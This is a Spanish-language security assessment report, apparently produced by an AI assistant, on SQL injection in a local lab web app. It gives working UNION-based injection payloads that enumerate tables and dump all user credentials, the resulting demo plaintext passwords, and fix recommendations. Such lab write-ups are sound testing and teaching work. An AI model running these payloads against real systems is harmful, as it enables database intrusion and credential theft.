# Informe de Análisis de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30 15:06:30  
**Analista:** GitHub Copilot CLI (claude-sonnet-4.6)

---

## Resumen Ejecutivo

Se identificó y explotó una vulnerabilidad crítica de **SQL Injection (Error-Based + UNION-Based)** en el parámetro `id` del formulario de búsqueda de usuarios. La explotación permitió extraer la estructura completa de la base de datos y todos los datos sensibles de los usuarios, incluyendo credenciales en texto plano.

---

## Detalles Técnicos

### Vulnerabilidad Detectada

| Atributo | Valor |
|---|---|
| **Tipo** | SQL Injection (Error-Based + UNION-Based) |
| **Severidad** | Crítica (CVSS 9.8) |
| **Parámetro vulnerable** | `id` (GET) |
| **URL** | `http://web.dev.local:8083/?id=<payload>&Submit=Submit` |
| **Archivo fuente** | `/var/www/html/low.php` (línea 11) |
| **Base de datos** | MariaDB |

### Prueba de Concepto

**1. Detección de error SQL:**
```
GET /?id=1'&Submit=Submit
```
Respuesta:
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right syntax 
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

**2. Determinación de columnas (UNION SELECT con 2 columnas):**
```
GET /?id=1' UNION SELECT 1,2-- -&Submit=Submit
```
Resultado: devuelve `First name: 1`, `Surname: 2` → la query original retorna 2 columnas.

**3. Extracción de información de la base de datos:**
```
GET /?id=1' UNION SELECT database(),user()-- -&Submit=Submit
```
- Base de datos activa: `sqli_demo`
- Usuario DB: `root@172.18.0.3`

**4. Enumeración de tablas:**
```
GET /?id=0' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()-- -&Submit=Submit
```
Tablas encontradas: `users`

**5. Enumeración de columnas de la tabla `users`:**
```
GET /?id=0' UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_name='users'-- -&Submit=Submit
```
Columnas: `user_id`, `first_name`, `last_name`, `username`, `password`, `email`

**6. Extracción completa de credenciales:**
```
GET /?id=0' UNION SELECT group_concat(user_id,0x3a,first_name,0x3a,last_name,0x3a,username,0x3a,password SEPARATOR 0x7c),2 FROM users-- -&Submit=Submit
```

---

## Datos Exfiltrados

| user_id | first_name | last_name | username | password |
|---|---|---|---|---|
| 1 | John | Doe | admin | password123 |
| 2 | Jane | Smith | jsmith | secret456 |
| 3 | Bob | Johnson | bjohnson | mypass789 |
| 4 | Alice | Williams | awilliams | qwerty123 |
| 5 | Charlie | Brown | cbrown | password |
| 6 | Diana | Davis | ddavis | secure123 |
| 7 | Eve | Miller | emiller | hackme |
| 8 | Frank | Wilson | fwilson | admin123 |

> ⚠️ **Las contraseñas se almacenan en texto plano**, lo que agrava significativamente el impacto de esta vulnerabilidad.

---

## Causa Raíz

El código en `/var/www/html/low.php` construye la query SQL concatenando directamente el input del usuario sin sanitización ni uso de consultas preparadas (prepared statements):

```php
// Código vulnerable (inferido)
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $query);
```

---

## Impacto

- **Confidencialidad:** Total. Se pueden extraer todos los datos de la base de datos.
- **Integridad:** Alta. El atacante puede modificar, insertar o eliminar datos.
- **Disponibilidad:** Media. Posible denegación de servicio mediante queries destructivas.
- **Escalada:** El usuario de BD es `root`, lo que podría permitir acceso al sistema de ficheros (`LOAD_FILE`, `INTO OUTFILE`).

---

## Recomendaciones

1. **Usar Prepared Statements / Consultas Parametrizadas:**
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar entradas:** Verificar que el parámetro `id` sea un entero antes de usarlo.

3. **Principio de mínimo privilegio:** El usuario de base de datos no debería ser `root`; usar un usuario con permisos mínimos necesarios.

4. **Almacenar contraseñas con hash:** Usar `bcrypt` o `argon2` en lugar de texto plano.

5. **Deshabilitar mensajes de error detallados en producción:** Los errores SQL no deben exponerse al usuario final.

6. **Implementar WAF:** Un Web Application Firewall puede ayudar a detectar y bloquear intentos de SQLi.

---

## Conclusión

La aplicación web presenta una vulnerabilidad crítica de SQL Injection que permite a cualquier atacante no autenticado extraer la totalidad de los datos de la base de datos, incluyendo credenciales de todos los usuarios en texto plano. Se requiere corrección inmediata.
